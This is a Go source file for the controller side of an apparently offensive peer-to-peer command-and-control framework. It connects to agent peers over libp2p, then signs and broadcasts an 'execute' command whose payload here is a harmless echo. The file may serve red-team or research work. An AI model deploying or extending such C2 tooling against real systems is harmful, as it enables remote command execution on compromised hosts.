package main

import (
	"context"
	"fmt"
	"os"
	"time"

	"github.com/google/uuid"
	"github.com/skoveit/nostalgia/pkg/core"
)

const (
	ControllerPort = 4001
)

func main() {
	fmt.Println("=== P2P C2 Controller Starting ===")

	// Create context with timeout
	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	// Setup libp2p host
	h, err := core.SetupHost(ctx, ControllerPort)
	if err != nil {
		fmt.Printf("Failed to setup host: %v\n", err)
		os.Exit(1)
	}
	defer h.Close()

	// Setup pubsub
	_, topic, err := core.SetupPubSub(ctx, h)
	if err != nil {
		fmt.Printf("Failed to setup pubsub: %v\n", err)
		os.Exit(1)
	}

	// Bootstrap peers (replace with actual agent address)
	// Format: /ip4/<IP>/tcp/<PORT>/p2p/<PEER_ID>
	// Example: "/ip4/127.0.0.1/tcp/5000/p2p/QmXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
	bootstrapPeers := []string{
		"/ip4/127.0.0.1/tcp/5000/p2p/12D3KooWEyoppNCUx8Yx66oV9fJnriXwCcXwDDUA2kj6vnc6iDEp",
		// Add more agent addresses here
	}

	// Connect to peers
	fmt.Println("\nAttempting to connect to agents...")
	err = core.ConnectToPeers(ctx, h, bootstrapPeers)
	if err != nil {
		fmt.Printf("Warning: %v\n", err)
		fmt.Println("Continuing anyway - commands will propagate when peers connect")
	}

	// Wait for connections to stabilize
	fmt.Println("\nWaiting for network to stabilize...")
	time.Sleep(3 * time.Second)

	// Create and sign command
	cmd := &core.Command{
		ID:        uuid.New().String(),
		Type:      "execute",
		Payload:   "echo 'Hello from P2P C2 Controller!'",
		Timestamp: time.Now(),
	}

	fmt.Printf("\nPreparing command: %s\n", cmd.ID)

	// Sign the command
	err = core.SignCommand(cmd)
	if err != nil {
		fmt.Printf("Failed to sign command: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("✓ Command signed successfully")

	// Publish command
	fmt.Println("\nPublishing command to topic...")
	err = core.PublishCommand(ctx, topic, cmd)
	if err != nil {
		fmt.Printf("Failed to publish command: %v\n", err)
		os.Exit(1)
	}

	fmt.Println("✓ Command published successfully")
	fmt.Println("\nCommand details:")
	fmt.Printf("  ID: %s\n", cmd.ID)
	fmt.Printf("  Type: %s\n", cmd.Type)
	fmt.Printf("  Payload: %s\n", cmd.Payload)

	// Wait a bit for message propagation
	fmt.Println("\nWaiting for message propagation...")
	time.Sleep(5 * time.Second)

	fmt.Println("\n✓ Controller operation completed")
}